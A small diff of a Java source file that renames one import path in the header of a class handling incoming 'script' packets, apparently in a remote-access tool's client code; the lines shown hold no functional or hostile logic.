@@ -1,6 +1,6 @@
 package jrat.client.packets.incoming;
 
-import io.jrat.common.script.AbstractScript;
+import jrat.common.script.AbstractScript;
 import jrat.client.Connection;
 
 public class Packet35Script extends AbstractIncomingPacket {
